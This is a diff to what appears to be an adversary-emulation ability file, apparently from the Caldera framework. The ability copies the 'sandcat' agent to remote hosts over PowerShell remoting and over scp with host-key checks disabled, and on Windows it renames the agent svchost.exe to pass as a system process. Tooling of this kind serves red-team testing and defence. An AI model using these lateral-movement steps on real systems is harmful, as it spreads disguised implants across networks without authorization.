@@ -18,23 +18,23 @@
             $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
             $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
             $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
-            Copy-Item -Path "sandcat.go-windows" -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+            Copy-Item -Path "#{sandcat.compile.name}-windows" -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
             Start-Sleep -s 5;
             Remove-PSSession -Session $session;
           };
           Receive-Job -Job $job -Wait;
-        payload: sandcat.go-windows
+        payload: sandcat.go
     darwin:
       sh:
         command: |
-          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{sandcat.compile.name}-darwin #{remote.ssh.cmd}:~
         cleanup: |
-          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm #{sandcat.compile.name}-darwin'
         payload: sandcat.go
     linux:
       sh:
         command: |
-          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~ &&
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{sandcat.compile.name}-linux #{remote.ssh.cmd}:~ &&
         cleanup: |
-          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm #{sandcat.compile.name}-linux'
         payload: sandcat.go
